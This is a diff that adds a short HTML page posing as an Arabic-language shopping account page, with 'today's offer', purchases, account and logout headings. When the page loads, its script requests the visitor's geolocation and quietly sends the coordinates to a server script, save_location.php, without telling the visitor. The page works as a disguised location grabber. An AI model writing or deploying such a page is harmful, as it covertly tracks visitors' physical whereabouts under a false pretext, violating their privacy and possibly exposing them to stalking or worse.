@@ -1,0 +1,47 @@
+
+<html>
+
+<body onload="getLocation()"; 
+
+
+   style="background-color:rgb(46, 44, 45);">
+
+   <h2> مظلوم </h2>
+   <p> عرض اليوم</p>
+  
+   <h1 style="background-color:rgb(255, 99, 71);">                                              مشترياتي</h1>
+   <h1 style="background-color:#ff6347;">                                                         الحساب                            </h1>
+   <h1 style="background-color:hsl(9, 100%, 64%);">                                          تسجيل الخروج</h1>
+   
+
+
+
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+
+function showPosition(position) { 
+     const xhttp= new XMLHttpRequest();
+     xhttp.open("GET", "save_location.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+     xhttp.send();
+  
+  
+ 
+}
+</script>
+
+</body>
+</html>
+
+
+
